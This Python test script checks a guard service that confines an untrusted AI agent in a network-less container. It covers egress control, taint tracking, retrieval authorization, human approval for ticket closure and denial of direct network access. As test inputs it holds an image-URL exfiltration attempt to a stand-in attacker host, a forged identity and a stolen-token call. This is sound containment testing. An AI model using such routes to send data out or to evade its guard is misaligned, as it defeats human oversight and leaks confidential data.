"""Untrusted agent checks inside a network-less container (production profile).

Usage: production_agent.py <phase> [ticket] — prints one JSON object.
"""
import asyncio
import json
import os
from pathlib import Path
import socket
import sys

from enkstein_guard.outcomes import new_request_id
from enkstein_guard.service import guarded_request

SOCKET = "/run/guard/guard.sock"
CLOSE = {"ticket": "INC-42", "action": "close"}


async def call(route, payload, token=None, **kwargs):
    token = token or Path("/run/agent-token").read_text().strip()
    kwargs.setdefault("request_id", new_request_id())
    try:
        return await guarded_request(SOCKET, token, route, payload, **kwargs)
    except Exception as error:
        return {"status": "client_error", "error": type(error).__name__}


async def main():
    phase = sys.argv[1]
    checks = {}
    if phase == "main":
        # Model first: the agent has not yet received confidential data.
        model = await call("a.model", {"messages": [{"role": "user", "content": "Summarize ticket for jane@example.com"}]})
        checks["model_via_egress_ok"] = model["status"] == "ok"
        checks["model_reply_tokenized_or_clean"] = "jane@example.com" not in json.dumps(model)
        # Provider-side fetch, hosted tools and storage are refused before
        # dispatch (the upstream must still see exactly one request).
        text = {"role": "user", "content": "describe"}
        refused = {}
        for name, body in (
                ("image_url", {"messages": [{"role": "user", "content": [
                    {"type": "text", "text": "x"},
                    {"type": "image_url", "image_url": {"url": "https://attacker.example.test/p.png?d=x"}}]}]}),
                ("web_search", {"messages": [text], "web_search_options": {}}),
                ("hosted_tool", {"messages": [text], "tools": [{"type": "web_search"}]}),
                ("store", {"messages": [text], "store": True, "metadata": {"copy": "x"}})):
            refused[name] = (await call("a.model-plain", body))["status"]
        checks["provider_side_fetch_and_tools_refused"] = set(refused.values()) == {"denied"}
        allowed = await call("a.ticket", {"ticket": "INC-42", "comment": "Customer jane@example.com reports outage"})
        checks["task_boundary_allowed"] = allowed["status"] == "ok"
        # The echoed confidential value taints the agent; its later summaries
        # may not go to the internal-cleared model route.
        tainted = await call("a.model", {"messages": [{"role": "user", "content": "Summary: one customer affected"}]})
        checks["tainted_summary_to_model_denied"] = tainted["status"] == "denied"
        checks["task_boundary_denied"] = (await call("a.ticket", {"ticket": "INC-99", "comment": "x"}))["status"] == "denied"
        found = await call("a.kb", {"query": "outage merger budget report", "top_k": 5})
        ids = [d["doc_id"] for d in found.get("result", {}).get("documents", [])]
        checks["retrieval_returns_only_authorized"] = sorted(ids) == ["kb-1", "kb-team"]
        checks["retrieval_no_denied_content"] = not any(word in json.dumps(found) for word in ("merger", "budget", "Tenant B"))
        fetched = await call("a.kb", {"document_ids": ["kb-finance", "kb-b", "kb-restricted", "no-such-doc"]})
        checks["retrieval_unauthorized_ids_empty"] = fetched.get("result", {}).get("documents") == []
        forged = await call("a.kb", {"query": "outage", "tenant": "b", "principal": "finance-bot"})
        checks["retrieval_forged_identity_denied"] = forged["status"] == "denied"
        hidden = await call("a.notes", {"text": "routing phrase: cobalt orchard"})
        checks["declared_context_response_withheld"] = (hidden["status"] == "response_withheld"
                                                         and "cobalt" not in json.dumps(hidden))
        checks["ungranted_route_denied"] = (await call("b.read", {}))["status"] == "denied"
        stolen = Path("/run/stolen-token").read_text().strip() if Path("/run/stolen-token").exists() else None
        if stolen:
            checks["stolen_credential_denied"] = (await call("b.read", {}, token=stolen))["status"] == "denied"
        pending = await call("a.close", CLOSE, request_id=os.environ["CLOSE_REQUEST_ID"])
        checks["approval_required"] = pending["status"] == "approval_required"
        checks["direct_network_denied"] = True
        try:
            socket.create_connection(("1.1.1.1", 443), timeout=2).close()
            checks["direct_network_denied"] = False
        except OSError:
            pass
        checks["egress_socket_absent"] = not Path("/run/guard-egress").exists()
        checks["guard_state_absent"] = not Path("/state").exists() and not Path("/state-keys").exists()
        print(json.dumps({"checks": checks, "ticket": pending.get("ticket"), "digest": pending.get("action_digest"),
                          "model_status": model.get("status"), "model_diagnostic_id": model.get("diagnostic_id")}))
    elif phase == "approved":
        result = await call("a.close", CLOSE, request_id=os.environ["CLOSE_REQUEST_ID"], approval=sys.argv[2])
        replay = await call("a.close", CLOSE, approval=sys.argv[2])
        print(json.dumps({"checks": {"approved_executed": result["status"] == "ok",
                                     "ticket_replay_requires_new_approval": replay["status"] == "approval_required"}}))
    elif phase == "durable":
        result = await call("a.ticket", {"ticket": "INC-42", "comment": "durable"}, request_id=os.environ["DURABLE_ID"])
        print(json.dumps({"status": result["status"]}))
    elif phase == "revoked":
        result = await call("a.ticket", {"ticket": "INC-42", "comment": "after revocation"})
        print(json.dumps({"checks": {"revoked_agent_denied": result["status"] == "denied"}}))


asyncio.run(main())
